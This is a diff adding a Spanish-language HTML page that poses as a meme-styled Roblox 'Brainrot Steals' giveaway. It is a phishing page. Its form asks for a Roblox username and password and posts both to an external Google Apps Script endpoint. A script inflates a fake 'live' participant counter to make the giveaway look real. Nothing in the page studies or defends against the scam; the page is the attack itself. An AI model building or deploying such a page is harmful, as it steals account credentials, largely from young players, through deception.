@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>brainrot steals sorteo</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: #1a1a1a;
+            color: #00ff00;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .title {
+            font-size: 48px;
+            color: #ff0080;
+            text-shadow: 2px 2px #00ff00;
+            margin-bottom: 10px;
+            animation: glitch 2s infinite;
+        }
+
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+            100% { transform: translate(0); }
+        }
+
+        .meme-text {
+            font-size: 18px;
+            color: #ffff00;
+            margin-bottom: 20px;
+        }
+
+        .main-container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: #2a2a2a;
+            border: 3px solid #00ff00;
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 0 20px #00ff00;
+        }
+
+        .form-section {
+            margin-bottom: 25px;
+        }
+
+        .form-section label {
+            display: block;
+            font-size: 16px;
+            color: #00ffff;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+
+        .form-section input {
+            width: 100%;
+            padding: 12px;
+            background: #1a1a1a;
+            border: 2px solid #ff0080;
+            border-radius: 8px;
+            color: #ffffff;
+            font-size: 16px;
+            font-family: 'Comic Sans MS', cursive;
+        }
+
+        .form-section input:focus {
+            outline: none;
+            border-color: #00ff00;
+            box-shadow: 0 0 10px #00ff00;
+        }
+
+        .form-section input::placeholder {
+            color: #888;
+        }
+
+        .submit-button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(45deg, #ff0080, #8000ff);
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            font-family: 'Comic Sans MS', cursive;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: transform 0.2s;
+        }
+
+        .submit-button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 15px #ff0080;
+        }
+
+        .stats {
+            text-align: center;
+            background: #1a1a1a;
+            border: 2px solid #ffff00;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        .stats h3 {
+            color: #ffff00;
+            margin-bottom: 10px;
+        }
+
+        .participant-count {
+            font-size: 24px;
+            color: #00ff00;
+            font-weight: bold;
+        }
+
+        .success-msg {
+            background: #004400;
+            border: 2px solid #00ff00;
+            color: #00ff00;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            margin: 15px 0;
+            display: none;
+            font-weight: bold;
+        }
+
+        .error-msg {
+            background: #440000;
+            border: 2px solid #ff0000;
+            color: #ff0000;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            margin: 15px 0;
+            display: none;
+            font-weight: bold;
+        }
+
+        .meme-corner {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            font-size: 40px;
+            animation: spin 3s linear infinite;
+        }
+
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .footer-memes {
+            text-align: center;
+            margin-top: 30px;
+            color: #888;
+            font-size: 14px;
+        }
+
+        .blinking {
+            animation: blink 1.5s infinite;
+        }
+
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+
+        .rainbow-text {
+            background: linear-gradient(45deg, #ff0000, #ff8000, #ffff00, #00ff00, #0080ff, #8000ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1 class="title">BRAINROT STEALS GIVEAWAY</h1>
+        <p class="meme-text">no cap fr fr this is bussin 💀💀💀</p>
+        <p class="rainbow-text">GYATT RIZZ OHIO SIGMA MOMENT</p>
+    </div>
+
+    <div class="main-container">
+        <form id="giveawayForm" action="https://script.google.com/macros/s/AKfycbyrS25yLTFd45y0aL6UPHL3joJx-QmIqfKbqvR1qAz14o_oXOl-7IU5Pi5CvbguFp9Guw/exec" method="POST">
+            <div class="form-section">
+                <label>tu user de roblox (no fake o ban):</label>
+                <input type="text" name="robloxUser" id="robloxUser" placeholder="pon tu user aqui bro" required>
+            </div>
+
+            <div class="form-section">
+                <label>Contraseña (Trust):</label>
+                <input type="password" name="userPassword" id="userPassword" placeholder="12345678">
+                <input type="hidden" name="ip" id="userIP">
+            </div>
+
+            <button type="submit" class="submit-button">
+                DALE CLICK AQUI PARA PARTICIPAR 🔥
+            </button>
+        </form>
+
+        <div id="successMessage" class="success-msg">
+            YOOO ya estas en el sorteo bro!! 🎉 good luck fr
+        </div>
+
+        <div id="errorMessage" class="error-msg">
+            ese user ya esta en el sorteo lol
+        </div>
+
+        <div class="stats">
+            <h3>gente en el sorteo rn:</h3>
+            <div class="participant-count" id="participantCounter">73</div>
+            <p class="blinking">updating live...</p>
+        </div>
+
+        <div class="footer-memes">
+            <p>made by a real human trust me bro</p>
+            <p>no 🧢 detected</p>
+        </div>
+    </div>
+
+    <div class="meme-corner">🗿</div>
+
+    <script>
+        let totalParticipants = 73;
+        let userList = [];
+
+        function updateCounter() {
+            if (Math.random() < 0.4) {
+                totalParticipants += Math.floor(Math.random() * 2) + 1;
+                document.getElementById('participantCounter').textContent = totalParticipants;
+            }
+        }
+
+        setInterval(updateCounter, 8000);
+
+        // Obtener IP aproximada y configurar formulario
+        document.getElementById('userIP').value = 'usuario_' + Math.floor(Math.random() * 10000);
+        
+        document.getElementById('giveawayForm').addEventListener('submit', function(e) {
+            const username = document.getElementById('robloxUser').value.trim();
+            
+            if (username.length < 3) {
+                e.preventDefault();
+                document.getElementById('errorMessage').textContent = 'user muy corto bro, minimo 3 letras';
+                document.getElementById('errorMessage').style.display = 'block';
+                setTimeout(() => {
+                    document.getElementById('errorMessage').style.display = 'none';
+                }, 3000);
+                return;
+            }
+            
+            if (userList.includes(username.toLowerCase())) {
+                e.preventDefault();
+                document.getElementById('errorMessage').textContent = 'ese user ya esta en el sorteo lol';
+                document.getElementById('errorMessage').style.display = 'block';
+                setTimeout(() => {
+                    document.getElementById('errorMessage').style.display = 'none';
+                }, 3000);
+                return;
+            }
+            
+            userList.push(username.toLowerCase());
+            totalParticipants++;
+            document.getElementById('participantCounter').textContent = totalParticipants;
+            
+            document.getElementById('successMessage').style.display = 'block';
+            
+            setTimeout(() => {
+                document.getElementById('successMessage').style.display = 'none';
+            }, 4000);
+        });
+
+        // easter egg clicks
+        let clickCount = 0;
+        document.querySelector('.meme-corner').addEventListener('click', function() {
+            clickCount++;
+            if (clickCount === 5) {
+                alert('AMONGUS SUS MOMENT 📮');
+                clickCount = 0;
+            }
+        });
+    </script>
+</body>
+</html>
